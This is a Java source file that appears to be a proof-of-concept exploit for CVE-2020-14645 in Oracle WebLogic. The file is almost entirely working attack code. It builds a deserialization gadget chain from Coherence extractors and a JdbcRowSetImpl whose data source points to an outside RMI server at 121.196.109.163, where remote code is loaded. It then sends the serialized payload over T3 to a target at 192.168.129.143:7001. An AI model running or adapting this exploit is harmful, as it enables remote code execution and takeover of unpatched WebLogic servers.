package com.supeream;


import com.sun.rowset.JdbcRowSetImpl;
import com.supeream.serial.Reflections;
import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.UniversalExtractor;

import java.util.PriorityQueue;

/**
 * @work: Exploit cve-2020-2555 vulnerability to attack WebLogic Serve
 */

public class CVE_2020_14645 {
    public static void main(String[] args) throws Exception {
        // CVE_2020_14645
        UniversalExtractor extractor = new UniversalExtractor("getDatabaseMetaData()", null, 1);
        final ExtractorComparator comparator = new ExtractorComparator(extractor);

        JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
        rowSet.setDataSourceName("rmi://121.196.109.163:1099/llxbvf");
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        Object[] q = new Object[]{rowSet, rowSet};
        Reflections.setFieldValue(queue, "queue", q);
        Reflections.setFieldValue(queue, "size", 2);
        byte[] payload = Serializables.serialize(queue);
        T3ProtocolOperation.send("192.168.129.143", "7001", payload);
    }
}